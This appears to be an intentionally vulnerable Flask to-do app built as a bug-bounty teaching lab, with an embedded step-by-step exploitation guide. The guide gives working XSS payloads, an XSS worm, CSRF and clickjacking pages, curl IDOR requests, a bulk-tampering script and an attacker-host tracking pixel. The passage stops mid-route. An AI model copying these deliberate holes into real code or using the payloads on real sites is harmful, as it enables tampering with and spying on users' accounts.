# app.py — Flask To‑Do Easy Lab (Pretty)
# -------------------------------------------------------------
# ⚠️ This is intentionally vulnerable for teaching purposes.
# Built to be tiny, pretty, and perfect for beginner bug bounty labs.
#
# Included vulnerabilities you can demonstrate:
#  - Stored XSS: task titles are rendered with |safe (see render in index()).
#  - Missing CSRF: state‑changing routes have no CSRF protection.
#  - IDOR / BAC: edit/delete/toggle routes do not verify task ownership.
#  - Weak session management: basic cookie session, no advanced safeguards.
#
# Notes:
#  - Uses SQLite (file: todo.db)
#  - One file, no templates folder — HTML is embedded for easy drop‑in.
#  - Tailwind via CDN for a clean, modern UI.
# -------------------------------------------------------------

from flask import Flask, g, request, redirect, url_for, render_template_string, session, flash
import sqlite3
from werkzeug.security import generate_password_hash, check_password_hash
from datetime import datetime, timedelta
from pathlib import Path

APP_NAME = "RatTasks"
DATABASE = "todo.db"
SECRET = "dev-secret-change-me"  # change in prod

app = Flask(__name__)
app.config.update(SECRET_KEY=SECRET)

LAST_CLEANUP = datetime.utcnow()

# ------------------------ DB Helpers ------------------------

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect(DATABASE, check_same_thread=False)
        g.db.row_factory = sqlite3.Row
    return g.db

@app.teardown_appcontext
def close_db(_):
    db = g.pop('db', None)
    if db is not None:
        db.close()

def init_db():
    db = get_db()
    db.executescript(
        """
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            created_at TEXT NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            title TEXT NOT NULL,
            done INTEGER NOT NULL DEFAULT 0,
            public INTEGER NOT NULL DEFAULT 0,
            created_at TEXT NOT NULL,
            FOREIGN KEY (user_id) REFERENCES users(id)
        );
        """
    )
    db.commit()
    try:
        db.execute('ALTER TABLE tasks ADD COLUMN public INTEGER NOT NULL DEFAULT 0')
        db.commit()
    except sqlite3.OperationalError:
        pass


@app.before_request
def auto_clear_tasks():
    global LAST_CLEANUP
    if datetime.utcnow() - LAST_CLEANUP > timedelta(minutes=30):
        db = get_db()
        db.execute('DELETE FROM tasks')
        db.commit()
        LAST_CLEANUP = datetime.utcnow()

# ------------------------ Utilities ------------------------

def current_user_id():
    return session.get('uid')

from functools import wraps

def login_required(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not current_user_id():
            flash("Please log in first.", "warning")
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return wrapper

# ------------------------ HTML Shell ------------------------

BASE = """
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>{{ title or app_name }}</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Google tag (gtag.js) -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2F41CFZTZZ"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());

      gtag('config', 'G-2F41CFZTZZ');
    </script>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
      body { font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, 'Helvetica Neue', Arial, 'Noto Sans', 'Apple Color Emoji', 'Segoe UI Emoji'; }
    </style>
  </head>
  <body class="min-h-screen bg-gradient-to-b from-slate-50 to-slate-100">
    <header class="sticky top-0 backdrop-blur bg-white/70 border-b border-slate-200 z-10">
      <div class="max-w-4xl mx-auto px-4 py-4 flex items-center justify-between">
        <a href="{{ url_for('index') }}" class="text-xl font-extrabold tracking-tight">🐀 {{ app_name }}</a>
        <nav class="flex items-center gap-3 text-sm">
          <a href="{{ url_for('guide') }}" class="px-3 py-1 rounded-lg border border-slate-300 hover:bg-white">Explotation Guide</a>
          <a href="{{ url_for('feed') }}" class="px-3 py-1 rounded-lg border border-slate-300 hover:bg-white">Feed</a>
          {% if uid %}
            <span class="text-slate-600">Hi, <strong>{{ username }}</strong></span>
            <a href="{{ url_for('logout') }}" class="px-3 py-1 rounded-lg bg-slate-900 text-white hover:bg-slate-800">Logout</a>
          {% else %}
            <a href="{{ url_for('login') }}" class="px-3 py-1 rounded-lg border border-slate-300 hover:bg-white">Login</a>
            <a href="{{ url_for('register') }}" class="px-3 py-1 rounded-lg bg-slate-900 text-white hover:bg-slate-800">Sign up</a>
          {% endif %}
        </nav>
      </div>
    </header>

    <main class="max-w-4xl mx-auto px-4 py-8">
      {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
          <div class="space-y-2 mb-6">
            {% for cat, msg in messages %}
              <div class="p-3 rounded-xl border {{ 'border-amber-300 bg-amber-50' if cat=='warning' else 'border-emerald-300 bg-emerald-50' }} text-slate-800">{{ msg }}</div>
            {% endfor %}
          </div>
        {% endif %}
      {% endwith %}

      {{ body|safe }}
    </main>

    <footer class="py-8 text-center text-xs text-slate-500">Built for teaching. Do not use in production.</footer>
  </body>
</html>
"""

GUIDE_HTML = """<h1 class='text-3xl font-extrabold mb-4'>RatTasks – Student Exploit Guide (Step‑by‑Step)</h1>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>**Educational use only.** These steps are designed for the RatTasks lab running on your own machine. Do not target systems you don’t own or don’t have explicit permission to test.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>0) Setup</h2>

<p>1. Create a Python venv and install deps:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   python3 -m venv venv &amp;&amp; source venv/bin/activate
   pip install flask werkzeug
</code></pre>
<p>2. Run the app:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   python app.py
</code></pre>
<p>3. Open **[http://127.0.0.1:5000](http://127.0.0.1:5000)**. Create an account and log in.</p>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Tip: Keep DevTools → Network tab open to watch requests.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>1) Stored XSS in Task Title</h2>

<p>**Vulnerability:** Task titles are rendered with `|safe`, so HTML/JS executes when the task list renders.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<p>1. Log in.</p>
<p>2. In the **Add task** input, paste any of the payloads below and click **Add**:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;
</code></pre>

<p>   Alternative payloads (helpful if a naive `&lt;script&gt;` filter is later added):</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
   &lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;
   &lt;svg/onload=alert(&#x27;XSS&#x27;)&gt;
   &lt;a href=javascript:alert(&#x27;XSS&#x27;)&gt;click me&lt;/a&gt;
</code></pre>
<p>3. Reload or navigate to `/` to trigger execution if needed.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>What you should observe</h3>

<ul class="list-disc ml-6">
<li>An alert pops up. That’s **stored XSS** because your payload is saved to the DB and runs for anyone who views the list.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Bonus: Using XSS to perform actions</h3>

<p>Because the session cookie is automatically sent by the browser, your script can make **authenticated** requests even if the cookie is `HttpOnly`.</p>

<p>Try editing your own task title via XHR/fetch from XSS:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;script&gt;
fetch(&#x27;/edit/1&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=HACKED+by+XSS&#x27;
});
&lt;/script&gt;
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Replace `1` with the actual task ID of **your** task. This demonstrates how XSS lets an attacker act as the victim.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>2) IDOR / Broken Access Control on Edit, Delete, Toggle</h2>

<p>**Vulnerability:** The routes `/edit/&lt;id&gt;`, `/delete/&lt;id&gt;`, `/toggle/&lt;id&gt;` do **not** verify that the task belongs to the logged‑in user.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Prepare</h3>

<ul class="list-disc ml-6">
<li>Create **User A** and add a task.</li>
<li>Log out, create **User B** and add a task.</li>
<li>Note: Task IDs are global auto‑increment integers across all users.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Find valid task IDs</h3>

<p>1. While logged in as **User A**, try to open ids you don’t own using the edit page:</p>

<p>   * Visit: `http://127.0.0.1:5000/edit/1`, `/edit/2`, `/edit/3`, … until you **don’t** see “Task not found” and instead see the **Edit task** form for a task that isn’t yours.</p>
<p>   * This confirms the ID exists and is accessible.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Edit someone else’s task (horizontal privilege escalation)</h3>

<ul class="list-disc ml-6">
<li>Using the edit form you just opened, change the title and save. You’ve modified another user’s task.</li>
</ul>

<p>**cURL version (replace `42` with the victim’s task id):**</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -X POST \
  -H &#x27;Content-Type: application/x-www-form-urlencoded&#x27; \
  -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  --data &#x27;title=Owned+by+User+A&#x27; \
  http://127.0.0.1:5000/edit/42
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>Get your `session` cookie from DevTools → Application → Cookies.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Toggle someone else’s completion flag</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  http://127.0.0.1:5000/toggle/42
</code></pre>

<h3 class='text-xl font-semibold mt-4 mb-2'>Exploit: Delete someone else’s task</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
curl -i -b &#x27;session=&lt;YOUR_FLASK_SESSION_COOKIE&gt;&#x27; \
  http://127.0.0.1:5000/delete/42
</code></pre>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>The delete route does not verify ownership and always flashes “Task deleted” even if nothing happened — use `/edit/&lt;id&gt;` first to confirm the ID exists.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>What you should observe</h3>

<ul class="list-disc ml-6">
<li>You can modify, toggle, or delete tasks **you don’t own**. That’s an **IDOR/BAC** flaw.</li>
</ul>

<h3 class='text-xl font-semibold mt-4 mb-2'>Additional BAC / IDOR scenarios to try</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Mark a victim’s task as done/undone repeatedly via `/toggle/&lt;id&gt;` to disrupt their workflow.</li>
<li>Overwrite the task title with attacker-controlled HTML (e.g., `&lt;img src=x onerror=...&gt;`) via `/edit/&lt;id&gt;` to weaponize stored XSS in someone else’s account.</li>
<li>Set the `public` checkbox when editing a victim task to expose previously private notes on the `/feed` page.</li>
<li>Clear the `public` checkbox on a collaborator’s public task to silently hide it from the feed.</li>
<li>Append instructions like “Send password to …” into another user’s task title to phish them when they next log in.</li>
<li>Iterate through IDs and delete every task you find, demonstrating how destructive a simple IDOR script can be.</li>
<li>Flip the same task repeatedly to generate misleading activity patterns a blue team would struggle to trust.</li>
<li>Edit a victim’s task to include tracking pixels (e.g., `&lt;img src="https://attacker.tld/pixel"&gt;`) and monitor when they open their list.</li>
<li>Change multiple victim tasks to include unique IDs so you can map which task IDs belong to which victims as they revert the edits.</li>
<li>Use `/edit/&lt;id&gt;` to add markdown-looking text that tricks the victim into following attacker-supplied “instructions”.</li>
<li>Combine delete and edit IDORs: first edit a victim task to warn them, then immediately delete it to show race-condition style tampering.</li>
<li>Force a victim’s “done” tasks back to incomplete status so their dashboard always looks unfinished.</li>
<li>Rename tasks with profanity or defacements to demonstrate reputational risk from unauthorized edits.</li>
<li>Modify someone’s task to embed an `&lt;iframe&gt;` pointing to a malicious site that loads whenever they view their list.</li>
<li>Script an attack that toggles every discovered task ID once per minute, creating chaos across all users simultaneously.</li>
</ol>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>3) CSRF on Add, Edit, Toggle, Delete</h2>

<p>**Vulnerability:** There’s no CSRF protection. State‑changing endpoints accept requests with only the victim’s cookie for auth.</p>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>For the following, the victim must be **logged in** to RatTasks in the same browser.</blockquote>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Add a task (auto‑submit form)</h3>

<p>Create a local HTML file (e.g., `csrf-add.html`) and open it in your browser while logged in to RatTasks:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF injected task!&quot;&gt;
&lt;/form&gt;
&lt;script&gt;document.getElementById(&#x27;f&#x27;).submit();&lt;/script&gt;
</code></pre>

<p>**Result:** A new task appears in the victim account.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Delete a known task via `GET`</h3>

<p>Because delete uses `GET`, an attacker can use an image tag:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;img src=&quot;http://127.0.0.1:5000/delete/42&quot; style=&quot;display:none&quot;&gt;
</code></pre>

<p>**Result:** Visiting this page while logged in to RatTasks deletes task `42`.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Toggle a task via `GET`</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;img src=&quot;http://127.0.0.1:5000/toggle/42&quot; style=&quot;display:none&quot;&gt;
</code></pre>

<p>**Result:** Task `42` flips between done/undone.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>CSRF: Edit via POST</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/edit/42&quot; method=&quot;POST&quot; id=&quot;f&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF changed your title&quot;&gt;
&lt;/form&gt;
&lt;script&gt;f.submit();&lt;/script&gt;
</code></pre>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>4) Clickjacking (No Frame Protections)</h2>

<p>**Vulnerability:** No `X-Frame-Options` or CSP → pages can be iframed and overlaid with deceptive UI.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>PoC</h3>

<p>Create `clickjack.html` and open it while logged in:</p>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>
&lt;!doctype html&gt;
&lt;style&gt;
  iframe { position: absolute; top:0; left:0; width:100vw; height:100vh; opacity:0.1; }
  button.fake { position:absolute; top:120px; left:120px; padding:20px; }
&lt;/style&gt;
&lt;button class=&quot;fake&quot;&gt;Click here for FREE COFFEE ☕&lt;/button&gt;
&lt;iframe src=&quot;http://127.0.0.1:5000/delete/42&quot;&gt;&lt;/iframe&gt;
</code></pre>

<p>**Result:** Clicking the visible button actually clicks the hidden delete link beneath it.</p>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>5) Recon Tips &amp; ID Discovery</h2>

<ul class="list-disc ml-6">
<li>**ID Guessing:** Since IDs are incremental, create a few tasks and note the growth (e.g., your first task might be 7, then 8, etc.). Older IDs likely belong to other accounts.</li>
<li>**Existence Check:** `/edit/&lt;id&gt;` returns an edit form when the ID exists; otherwise you’ll see a “Task not found” flash. Use that to confirm valid IDs.</li>
<li>**Network Tab:** Watch which endpoints the UI calls when you click **Edit**, **Delete**, or toggle the checkbox.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>6) Suggested Write‑Up Structure (for reports)</h2>

<p>1. **Title**: Stored XSS in Task Title leads to account actions via authenticated fetch</p>
<p>2. **Summary**: Explain the impact and where the bug lives.</p>
<p>3. **Steps to Reproduce**: Copy the exact steps/payloads above.</p>
<p>4. **Impact**: Session‑authenticated actions; potential for persistent worm; user data manipulation.</p>
<p>5. **Remediation**:</p>

<p>   * Escape output; remove `|safe` unless output is pre‑sanitized.</p>
<p>   * Add CSRF tokens to state‑changing routes; avoid `GET` for destructive actions.</p>
<p>   * Verify ownership on all task mutations: `WHERE id = ? AND user_id = ?`.</p>
<p>   * Add `X-Frame-Options: DENY` and a strict CSP.</p>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>7) Quick Checklist (What to Demonstrate)</h2>

<ul class="list-disc ml-6">
<li>[ ] Add `&lt;script&gt;alert(1)&lt;/script&gt;` task → alert triggers on list view (Stored XSS).</li>
<li>[ ] Use `/edit/&lt;id&gt;` to confirm other users’ task existence.</li>
<li>[ ] Change another user’s task title via `/edit/&lt;id&gt;` (IDOR).</li>
<li>[ ] Delete another user’s task via `/delete/&lt;id&gt;` (IDOR).</li>
<li>[ ] Trigger CSRF add via auto‑submit form.</li>
<li>[ ] Trigger CSRF delete/toggle via hidden `&lt;img&gt;`.</li>
<li>[ ] Demonstrate clickjacking PoC.</li>
</ul>

<blockquote class='border-l-4 pl-4 italic text-slate-600'>That’s it. Keep your tests scoped to your own local RatTasks instance.</blockquote>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>8) IDOR: Force Victim Tasks Public</h2>

<p><strong>Goal:</strong> Use the existing edit IDOR to flip another user’s private task into the public feed.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Enumerate a task ID owned by another user (see Module 2 for techniques).</li>
<li>Visit <code>http://127.0.0.1:5000/edit/&lt;victim_id&gt;</code> while logged in as yourself.</li>
<li>Check the <strong>Public</strong> box, keep or change the title, and click <strong>Save</strong>.</li>
<li>Open <code>/feed</code> in a separate tab or browser profile.</li>
</ol>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>The victim’s task now appears on the public feed, even though they never opted in. This demonstrates a <strong>privacy impact</strong> from the IDOR.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>9) IDOR: Bulk Tampering Script</h2>

<p><strong>Goal:</strong> Automate BAC exploitation to show how little effort it takes to destroy data at scale.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Proof-of-concept script (Python + <code>requests</code>)</h3>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>import requests

BASE = &quot;http://127.0.0.1:5000&quot;
COOKIE = {&quot;session&quot;: &quot;&lt;paste_your_cookie_here&gt;&quot;}

for task_id in range(1, 101):
    r = requests.post(
        f&quot;{BASE}/edit/{task_id}&quot;,
        data={&quot;title&quot;: f&quot;Owned #{task_id}&quot;, &quot;public&quot;: &quot;on&quot;},
        cookies=COOKIE,
        allow_redirects=False,
    )
    if r.status_code == 302:
        print(f&quot;Edited task {task_id}&quot;)</code></pre>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>In seconds you can mass-edit titles and flip tasks public, illustrating how dangerous an unprotected IDOR can be once scripted.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>10) Stored XSS Worm via Public Feed</h2>

<p><strong>Goal:</strong> Chain the stored XSS with BAC so any victim who views the feed unknowingly propagates the payload.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Use Module 8 to make a victim task public.</li>
<li>Edit that task and replace the title with:</li>
</ol>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;script&gt;
fetch(&#x27;/edit/42&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=&#x27; + encodeURIComponent(&#x27;Worm!&#x27;) + &#x27;&amp;public=on&#x27;
});
fetch(&#x27;/&#x27;, {
  method: &#x27;POST&#x27;,
  headers: {&#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27;},
  body: &#x27;title=Worm+propagation&amp;public=on&#x27;
});
&lt;/script&gt;</code></pre>

<p>3. View <code>/feed</code> in another browser. The script runs for any logged-in viewer, adding more worm tasks. Replace <code>42</code> with the victim task ID you discovered.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>A single malicious edit can spread automatically, showcasing combined impact of stored XSS + BAC.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>11) CSRF + IDOR Chain</h2>

<p><strong>Goal:</strong> Build an external page that tricks an authenticated victim into editing someone else’s task on your behalf.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Steps</h3>

<ol class="list-decimal ml-6 space-y-1">
<li>Identify a target task ID (e.g., <code>37</code>).</li>
<li>Create a file <code>csrf-idor.html</code> with:</li>
</ol>

<pre class="bg-slate-100 p-4 rounded overflow-x-auto"><code>&lt;!doctype html&gt;
&lt;form action=&quot;http://127.0.0.1:5000/edit/37&quot; method=&quot;POST&quot; id=&quot;steal&quot;&gt;
  &lt;input name=&quot;title&quot; value=&quot;CSRF defacement&quot;&gt;
  &lt;input name=&quot;public&quot; value=&quot;on&quot;&gt;
&lt;/form&gt;
&lt;script&gt;steal.submit();&lt;/script&gt;</code></pre>

<p>3. Send the link to a logged-in victim. When they open it, their browser submits the form.</p>

<h3 class='text-xl font-semibold mt-4 mb-2'>Result</h3>

<ul class="list-disc ml-6">
<li>The victim unknowingly edits another user’s task. This demonstrates how CSRF multiplies the blast radius of the existing IDOR.</li>
</ul>

<p>---</p>

<h2 class='text-2xl font-bold mt-6 mb-3'>12) Blue Team Mitigation Drills</h2>

<p>Use these scenarios to practice defending the app after demonstrating the exploits:</p>

<ul class="list-disc ml-6">
<li>Add ownership checks (<code>WHERE id = ? AND user_id = ?</code>) on every task mutation.</li>
<li>Log suspicious patterns like dozens of edits from a single IP in seconds.</li>
<li>Add CSRF tokens and require POST/DELETE for destructive actions.</li>
<li>Sanitize or escape task titles before rendering; remove <code>|safe</code> entirely.</li>
<li>Require re-authentication before enabling the <strong>Public</strong> flag to avoid silent privacy flips.</li>
</ul>"""

# ------------------------ Routes: Auth ------------------------

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        if not username or not password:
            flash('Username and password required.', 'warning')
            return redirect(url_for('register'))
        db = get_db()
        try:
            db.execute(
                'INSERT INTO users (username, password_hash, created_at) VALUES (?, ?, ?)',
                (username, generate_password_hash(password), datetime.utcnow().isoformat())
            )
            db.commit()
        except sqlite3.IntegrityError:
            flash('Username already taken.', 'warning')
            return redirect(url_for('register'))
        flash('Account created. Please log in.', 'ok')
        return redirect(url_for('login'))

    body = f"""
    <div class='max-w-md mx-auto'>
      <h1 class='text-3xl font-bold mb-6'>Create your account</h1>
      <form method='post' class='space-y-4 bg-white p-6 rounded-2xl shadow'>
        <div>
          <label class='block text-sm font-medium mb-1'>Username</label>
          <input name='username' class='w-full rounded-xl border border-slate-300 px-3 py-2' placeholder='ratmaster' />
        </div>
        <div>
          <label class='block text-sm font-medium mb-1'>Password</label>
          <input type='password' name='password' class='w-full rounded-xl border border-slate-300 px-3 py-2' />
        </div>
        <button class='w-full rounded-xl bg-slate-900 text-white py-2 font-semibold hover:bg-slate-800'>Sign up</button>
        <p class='text-sm text-slate-600 text-center'>Already have an account? <a href='{url_for('login')}' class='underline'>Log in</a></p>
      </form>
    </div>
    """
    return render_template_string(BASE, title=f"Sign up • {APP_NAME}", body=body, app_name=APP_NAME, uid=current_user_id(), username=session.get('uname'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        db = get_db()
        row = db.execute('SELECT * FROM users WHERE username = ?', (username,)).fetchone()
        if row and check_password_hash(row['password_hash'], password):
            session['uid'] = row['id']
            session['uname'] = row['username']
            flash('Welcome back!', 'ok')
            return redirect(url_for('index'))
        flash('Invalid credentials.', 'warning')
        return redirect(url_for('login'))

    body = f"""
    <div class='max-w-md mx-auto'>
      <h1 class='text-3xl font-bold mb-6'>Log in</h1>
      <form method='post' class='space-y-4 bg-white p-6 rounded-2xl shadow'>
        <div>
          <label class='block text-sm font-medium mb-1'>Username</label>
          <input name='username' class='w-full rounded-xl border border-slate-300 px-3 py-2' placeholder='ratmaster' />
        </div>
        <div>
          <label class='block text-sm font-medium mb-1'>Password</label>
          <input type='password' name='password' class='w-full rounded-xl border border-slate-300 px-3 py-2' />
        </div>
        <button class='w-full rounded-xl bg-slate-900 text-white py-2 font-semibold hover:bg-slate-800'>Log in</button>
        <p class='text-sm text-slate-600 text-center'>No account yet? <a href='{url_for('register')}' class='underline'>Sign up</a></p>
      </form>
    </div>
    """
    return render_template_string(BASE, title=f"Log in • {APP_NAME}", body=body, app_name=APP_NAME, uid=current_user_id(), username=session.get('uname'))

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out.', 'ok')
    return redirect(url_for('login'))


@app.route('/guide')
def guide():
    body = f"<h1 class='text-3xl font-bold mb-6'>Explotation Guide</h1><div class='space-y-4'>{GUIDE_HTML}</div>"
    return render_template_string(
        BASE,
        title=f"Explotation Guide • {APP_NAME}",
        body=body,
        app_name=APP_NAME,
        uid=current_user_id(),
        username=session.get('uname'),
    )

# ------------------------ Routes: Tasks ------------------------

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    db = get_db()
    uid = current_user_id()

    if request.method == 'POST':
        title = request.form.get('title', '').strip()
        is_public = 1 if request.form.get('public') else 0
        if not title:
            flash('Task title required.', 'warning')
            return redirect(url_for('index'))
        db.execute(
            'INSERT INTO tasks (user_id, title, public, created_at) VALUES (?, ?, ?, ?)',
            (uid, title, is_public, datetime.utcnow().isoformat())
        )
        db.commit()
        flash('Task added.', 'ok')
        return redirect(url_for('index'))

    # NOTE: Deliberate XSS risk: in the HTML below, we will render title with |safe.
    tasks = db.execute('SELECT * FROM tasks WHERE user_id = ? ORDER BY done, id DESC', (uid,)).fetchall()

    items_html = "\n".join([
        f"""
        <li class='group flex items-center justify-between p-3 bg-white rounded-xl border border-slate-200 hover:shadow-sm transition'>
          <div class='flex items-center gap-3'>
            <input type='checkbox' onclick="window.location='{url_for('toggle', task_id=row['id'])}'" {'checked' if row['done'] else ''} class='h-4 w-4 rounded border-slate-300' />
            <span class='{'line-through text-slate-400' if row['done'] else 'text-slate-800'}'>{row['title']}</span>
            {'<span class="text-xs text-slate-500">🌐</span>' if row['public'] else ''}
          </div>
            <div class='opacity-0 group-hover:opacity-100 transition flex items-center gap-2'>
              <a class='px-2 py-1 text-xs rounded-lg border' href='/edit/{row['id']}'>Edit</a>
              <a class='px-2 py-1 text-xs rounded-lg border border-red-300 text-red-700' href='/delete/{row['id']}'>Delete</a>
            </div>
        </li>
        """ for row in tasks
    ])

    body = f"""
    <div class='flex items-center justify-between mb-6'>
        <div>
          <h1 class='text-3xl font-extrabold'>Your tasks</h1>
          <p class='text-slate-600'>Quick, clean, and a little bit dangerous (for learning 😉).</p>
          <p class='text-slate-500 text-sm'>All tasks are cleared every 30 minutes.</p>
        </div>
      <a href='{url_for('seed_demo')}' class='text-sm underline'>Seed demo tasks</a>
    </div>

    <form method='post' class='mb-6 bg-white p-4 rounded-2xl shadow flex items-center gap-3'>
      <input name='title' class='flex-1 rounded-xl border border-slate-300 px-3 py-2' placeholder='Write a task… (try <script>alert(1)</script>)' />
      <label class='flex items-center gap-2 text-sm'>
        <input type='checkbox' name='public' class='rounded border-slate-300' /> Public
      </label>
      <button class='rounded-xl bg-slate-900 text-white px-4 py-2 font-semibold hover:bg-slate-800'>Add</button>
    </form>

    <ul class='space-y-2'>
      {items_html or "<li class='text-slate-500'>No tasks yet. Add your first one!</li>"}
    </ul>
    """

    return render_template_string(BASE, title=f"Tasks • {APP_NAME}", body=body, app_name=APP_NAME, uid=uid, username=session.get('uname'))

@app.route('/feed')
def feed():
    db = get_db()
    uid = current_user_id()
    page = max(int(request.args.get('page', 1) or 1), 1)
    per_page = 10
    offset = (page - 1) * per_page

    query = "SELECT tasks.*, users.username FROM tasks JOIN users ON tasks.user_id = users.id WHERE tasks.public = 1"
    params = []
    if uid:
        query += " AND tasks.user_id != ?"
        params.append(uid)
    query += " ORDER BY tasks.id DESC LIMIT ? OFFSET ?"
    params.extend([per_page + 1, offset])
    rows = db.execute(query, params).fetchall()
    has_next = len(rows) > per_page
    rows = rows[:per_page]

    items_html = "\n".join([
        f"""
      <li class='p-3 bg-white rounded-xl border border-slate-200'>
        <div class='flex items-center justify-between'>
          <span class='text-slate-800'>{{{{ (""" + row['title'] + """) | safe }}}}</span>
          <span class='text-slate-500 text-sm'>@{row['username']}</span>
        </div>
      </li>
      """ for row in rows
    ])

    nav_html = ""
    if page > 1 or has_next:
        prev_link = f"<a href='/feed?page={page-1}' class='underline'>Prev</a>" if page > 1 else "<span></span>"
        next_link = f"<a href='/feed?page={page+1}' class='underline'>Next</a>" if has_next else ""
        nav_html = f"<div class='flex justify-between mt-6'>{prev_link}{next_link}</div>"

    body = f"""
    <h1 class='text-3xl font-extrabold mb-6'>Public feed</h1>
    <ul class='space-y-2'>
      {items_html or "<li class='text-slate-500'>No public tasks.</li>"}
    </ul>
    {nav_html}
